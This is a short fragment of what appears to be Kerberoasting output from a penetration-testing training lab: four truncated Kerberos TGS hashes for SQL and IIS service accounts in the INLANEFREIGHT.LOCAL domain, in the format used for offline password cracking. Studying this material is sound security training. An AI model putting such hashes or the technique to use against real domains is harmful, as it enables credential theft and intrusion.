$krb5tgs$23$*sqlprod$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01~1433*$577b69c3a2abcff0fc3318fd94f90014$9272d9d177c6147a1b773ba12f95<SNIP>
$krb5tgs$23$*sqlqa$INLANEFREIGHT.LOCAL$MSSQL_svc_qa/inlanefreight.local~1443*$edaecbbcd610e2dd3ef39d6ea2cb3838$b5dbb92fb35b<SNIP>
$krb5tgs$23$*sql-test$INLANEFREIGHT.LOCAL$MSSQL_svc_test/inlanefreight.local~1443*$989e43ca34c03490e7de627135599ab4$832a1d7<SNIP>
$krb5tgs$23$*adam.jones$INLANEFREIGHT.LOCAL$IIS_dev/inlanefreight.local~80*$2b9cfebc5043606bbebb9f140bdf48cb$c05bf3d19a3e26<SNIP>
```

